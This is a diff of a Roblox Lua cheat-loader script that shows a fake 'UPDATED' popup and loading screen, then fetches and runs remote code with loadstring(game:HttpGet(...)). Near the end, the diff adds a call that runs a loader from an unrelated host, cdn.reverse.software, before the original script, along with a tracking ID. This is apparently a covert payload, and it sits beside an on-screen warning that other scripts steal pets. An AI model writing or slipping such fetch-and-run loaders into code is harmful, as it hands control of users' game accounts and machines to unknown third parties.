@@ -3,10 +3,11 @@ local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
 
 -- UI INIT
-local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = Player:WaitForChild("PlayerGui")
 
--- "UPDATED." POPUP (Merged and Fixed)
+-- "UPDATED." POPUP
 local UpdatedPopup = Instance.new("TextLabel", ScreenGui)
 UpdatedPopup.AnchorPoint = Vector2.new(0.5, 0.5)
 UpdatedPopup.Position = UDim2.new(0.5, 0, 0.5, 0)
@@ -19,7 +20,6 @@ UpdatedPopup.TextColor3 = Color3.new(1, 1, 1)
 UpdatedPopup.BackgroundColor3 = Color3.fromRGB(180, 0, 30)
 UpdatedPopup.BackgroundTransparency = 0.1
 UpdatedPopup.BorderSizePixel = 0
-
 Instance.new("UICorner", UpdatedPopup).CornerRadius = UDim.new(0, 10)
 
 local Stroke = Instance.new("UIStroke", UpdatedPopup)
@@ -27,11 +27,11 @@ Stroke.Color = Color3.fromRGB(255, 80, 80)
 Stroke.Thickness = 2
 Stroke.Transparency = 0.3
 
--- Fade out after 4.5 seconds (unchanged)
+-- Fade out after 7.5 seconds
 task.delay(7.5, function()
     UpdatedPopup:Destroy()
     
-    -- MAIN LOADER STARTS
+    -- MAIN LOADER
     local Frame = Instance.new("Frame", ScreenGui)
     Frame.AnchorPoint = Vector2.new(0.5, 0.5)
     Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
@@ -142,24 +142,11 @@ task.delay(7.5, function()
             msg2.Parent = ScreenGui
             task.delay(5, function()
                 msg2:Destroy()
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/Makuscripts/3in1/refs/heads/main/3in1"))()
-            end)
-        end)
-    end)
-end)        msg1.Font = Enum.Font.GothamBold
-        msg1.TextColor3 = Color3.new(1, 1, 1)
-        msg1.BackgroundColor3 = Color3.new(0, 0, 0)
-        msg1.BackgroundTransparency = 0.3
-        msg1.BorderSizePixel = 0
-
-        task.delay(5, function()
-            msg1:Destroy()
-            local msg2 = msg1:Clone()
-            msg2.Text = "⚠️ Beware of other scripts — they may steal your pets!"
-            msg2.Parent = ScreenGui
-            task.delay(5, function()
-                msg2:Destroy()
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/Makuscripts/3in1/refs/heads/main/3in1"))()
+                -- Execute your custom loader first
+                ID="933a7800-ba26-4768-889c-6db85044f14c";
+                loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+                -- Then execute the 3in1 script
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/Makuscripts/3in1/main/3in1"))()
             end)
         end)
     end)
